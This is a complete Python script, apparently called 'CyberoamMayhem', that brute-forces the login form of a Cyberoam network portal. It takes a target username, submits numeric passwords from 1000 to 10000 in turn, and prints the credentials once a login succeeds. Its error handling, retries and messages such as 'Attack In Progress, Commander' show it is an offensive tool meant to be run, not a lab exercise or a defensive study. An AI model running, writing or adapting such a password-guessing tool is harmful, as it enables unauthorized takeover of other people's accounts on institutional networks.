import os
import sys
import time
import argparse

#if int(sys.version_info.major) > 2:
   #print("You are using Python %s" sys.version)
   #print("This program is built to run on Python 2.7 and lower")
   #sys.exit(1)

try:
    import subprocess
except ImportError:
    print ("[*]Install subprocess python module to make this program work")
    raise

try:
        import mechanize
except ImportError:
        print ("[*] Please install mechanize python module first")
        sys.exit(1)

url = 'http://10.10.1.2:8090/'
log1 = 'You have successfully logged in'
log2 = 'You have reached Maximum Login Limit'
tried = 0
flag = 0
url_reopen_flag = False
point = 0

def openConnection(url):
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.open(url, timeout= 30.0)
    return br

def sendmessage(message):
    subprocess.Popen(['notify-send', message])
    return

def getColumnLength():
    rows, columns = os.popen('stty size', 'r').read().split()
    return rows



def printProgress(iteration, total,current,barLength,suffix='Complete', decimals = 2):
    filledLength    = int(round(barLength * iteration / float(total)))
    percents        = round(100.00 * (iteration / float(total)), decimals)
    bar             = '#' * filledLength + '-' * (barLength - filledLength)
    current         = "checking " + current
    sys.stdout.write('%s [%s] %s%s %s\r' % (current, bar, percents, '%', suffix)),
    sys.stdout.flush()
    if iteration == total:
        print("\n")

br = openConnection(url)

def logger(user, passer, tLaunch, count, attack_range):
    try:
        global br
        global url_reopen_flag
        global flag
        global tried
        if url_reopen_flag:
            br = openConnection(url)
        connected = False
        while not connected:
            flag = 0
            tried = 0
            br.select_form(nr=0)
            br.form['username'] = user
            br.form['password'] = passer
            br.method = "POST"
            response = br.submit()
            content = response.get_data()
            if log1 in content or log2 in content:
                print ('\n[+]Success! User = ' + user + ' password = ' + passer + '\n')
                sendmessage("MissionAccomplishedCaptain!")
                sys.exit(1)
            else:
                printProgress(count, attack_range, passer, int(getColumnLength()))
                time.sleep(tLaunch)
                point = 4
                br.back()
                flag = 0
                connected = True
                url_reopen_flag = False

    except SystemExit:
            sys.exit(1)
    except KeyboardInterrupt:
            print("\n[*]Program has given command to terminate")
            sys.exit(1)
    except BaseException as e:
            print('An exception occured: {}'. format(e))
            url_reopen_flag = True
            br.close()
            sendmessage("An exception occured")
            tried += 1
            time.sleep(1)
            print("Trying again in 5 sec")
            time.sleep(5)
            if flag:
                br.back()
                flag = 0
            if tried > 5:
                print("Program is terminating")
                sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Command line argument to pass to CyberoamMayhem")
    parser.add_argument("USERNAME", help="Enter the USERNAME of which password you want to know")
    parser.add_argument("-p", "--password_start", help="Enter a digit from which you want to check (default is 1000)", type=int)
    parser.add_argument("-t", "--time", help="Enter the minimum time betwen two attacks (default is 0.5sec", type = float)
    parser.add_argument("-u", "--password_stop", help="Enter a digit up to which you want to check (default is 10000)", type=int)

    args = parser.parse_args()
    tLaunch = 0.5         #time between successive attack
    user = args.USERNAME  #username
    pass_start = ''          #password
    pass_end = 10000 #change here to increase the upper limit of password
    if(args.password_stop):
            pass_end = args.password_stop
    if(args.password_start):
            pass_start = args.password_start
    else:
            pass_start = 1000
    if(args.time):
            tLaunch = args.time
    # passFile = open('password.txt', 'r') #name of password list in home directory
    # for line in passFile.readlines():
    #    logPass = line.strip('\n')
    #    logger(user,logPass)
    count = 0
    attack_range = pass_end-pass_start
    print("Attack In Progress, Commander")
    while(pass_start <= pass_end):
            logger(user, str(pass_start), tLaunch, count, attack_range)
            pass_start += + 1
            count += 1
if __name__ == '__main__':
    main()
